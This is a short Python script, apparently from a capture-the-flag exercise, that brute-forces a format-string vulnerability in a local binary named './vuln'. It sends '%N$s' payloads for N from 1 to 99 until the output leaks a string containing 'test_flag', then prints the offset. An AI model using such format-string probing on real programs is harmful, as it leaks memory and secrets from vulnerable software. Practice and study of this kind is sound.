import subprocess

filename = "./vuln"

def run_bin(filename, input):
    echo_proc = subprocess.run(['echo', input], capture_output=True) #echo out this and pipe into the binary process
    bin_proc = subprocess.run([filename], input=echo_proc.stdout, capture_output=True)

    return(bin_proc.stdout)

for i in range(1, 100):
    output = run_bin(filename, f"%{i}$s")

    if "test_flag" in str(output):
        print(f"Found offset at {i}")
        print(output) 
        break
